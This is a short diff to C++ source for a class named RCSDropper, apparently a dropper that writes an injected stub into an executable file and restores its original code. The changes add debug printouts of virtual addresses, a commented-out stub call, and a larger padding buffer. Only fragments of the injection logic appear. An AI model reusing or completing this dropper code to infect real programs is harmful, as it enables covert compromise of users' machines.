@@ -88,6 +88,11 @@ std::size_t RCSDropper::restoreStub(DWORD currentVA) {
         DEBUG_MSG(D_VERBOSE, "Header   VA : %08x", headerVA);
         DEBUG_MSG(D_VERBOSE, "Dropper  VA : %08x", dropperVA);
         DEBUG_MSG(D_VERBOSE, "Stage1   VA : %08x", stage1VA);
+        printf("Current  VA : %08x\n", currentVA);
+        printf("Header   VA : %08x\n", headerVA);
+        printf("Dropper  VA : %08x\n", dropperVA);
+        printf("Stage1   VA : %08x\n", stage1VA);
+	printf("Restore  VA : %08x\n", restore);
     }
 
     DWORD restoreVA = currentVA + sizeof(DWORD);
@@ -114,6 +119,7 @@ stub.bind(start_loop);
 
     stub.nop();
     stub.call(((DWORD) restore) + (dropperVA - currentVA));
+    //stub.call(dropperVA - dropperVA);
     stub.nop();
     stub.popad();
     stub.nop();
@@ -199,7 +205,8 @@ RCSDropper::RCSDropper(const char* filepath) {
         throw std::runtime_error(filepath);
 
     std::size_t fileSize = bf::file_size(filepath);
-    size_ = fileSize + 8192;
+    //size_ = fileSize + 8192;
+    size_ = fileSize + 16384;
 
     // create buffer and zero it out
     data_.insert(data_.begin(), size_, 0);
